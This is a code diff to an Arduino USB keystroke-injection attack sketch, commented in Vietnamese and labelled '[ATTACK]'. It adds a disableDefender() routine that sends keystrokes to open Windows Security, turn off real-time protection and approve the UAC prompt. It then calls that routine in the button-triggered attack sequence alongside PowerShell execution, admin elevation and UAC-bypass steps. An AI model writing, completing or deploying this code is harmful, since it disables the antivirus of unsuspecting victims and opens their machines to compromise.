@@ -163,7 +163,65 @@ void signalComplete() {
 }
 
 void disableDefender() {
-
+    Serial.println("[BYPASS] Đang vô hiệu hóa Windows Defender...");
+    
+    // Mở Run
+    pressCombo(KEY_LEFT_GUI, 'r');
+    delay(800);
+    
+    // Mở Windows Security bằng lệnh
+    typeText("ms-settings:windowsdefender");
+    delay(200);
+    Keyboard.press(KEY_RETURN);
+    delay(50);
+    Keyboard.releaseAll();
+    delay(3000);  // Chờ mở
+    
+    // Tab đến Virus & threat protection
+    Keyboard.press(KEY_TAB);
+    delay(50);
+    Keyboard.releaseAll();
+    delay(150);
+    
+    Keyboard.press(KEY_RETURN);
+    delay(50);
+    Keyboard.releaseAll();
+    delay(2000);
+    
+    // Tab đến Manage settings
+    for(int i = 0; i < 4; i++) {
+        Keyboard.press(KEY_TAB);
+        delay(50);
+        Keyboard.releaseAll();
+        delay(150);
+    }
+    
+    Keyboard.press(KEY_RETURN);
+    delay(50);
+    Keyboard.releaseAll();
+    delay(1500);
+    
+    // Tắt Real-time protection
+    Keyboard.press(' ');
+    delay(50);
+    Keyboard.releaseAll();
+    delay(2500);
+    
+    // Xử lý UAC
+    Keyboard.press(KEY_LEFT_ALT);
+    delay(50);
+    Keyboard.press('y');
+    delay(100);
+    Keyboard.releaseAll();
+    delay(2000);
+    
+    // Đóng (nhấn Alt+F4 hai lần)
+    pressCombo(KEY_LEFT_ALT, KEY_F4);
+    delay(800);
+    pressCombo(KEY_LEFT_ALT, KEY_F4);
+    delay(800);
+    
+    Serial.println("[BYPASS] Đã hoàn tất vô hiệu hóa Defender");
 }
 
 // ============================================
@@ -189,21 +247,23 @@ void setup() {
 
 void loop() {
     if (digitalRead(buttonPin) == LOW) {
-        delay(300);  // Debounce
+        delay(300);
         digitalWrite(ledPin, HIGH);
         
         Serial.println("\n[ATTACK] BẮT ĐẦU TẤN CÔNG ===========>\n");
         
-        // Thực thi các bước
         step1_HideWindows();
+        
+        // Gọi hàm disableDefender (bỏ comment để dùng)
+        disableDefender();
+        
         step2_OpenRun();
         step3_ExecutePowerShell();
         step4_ElevateAdmin();
         step5_BypassUAC();
         
-        disableTaskManager();
+        // disableTaskManager();  // Comment vì đã có trong ps1
         
-        // Báo hiệu hoàn tất
         signalComplete();
         
         Serial.println("\n[ATTACK] KẾT THÚC ===================>\n");
@@ -211,7 +271,6 @@ void loop() {
         
         digitalWrite(ledPin, LOW);
         
-        // Chờ nhả nút
         while (digitalRead(buttonPin) == LOW) delay(10);
     }
 }
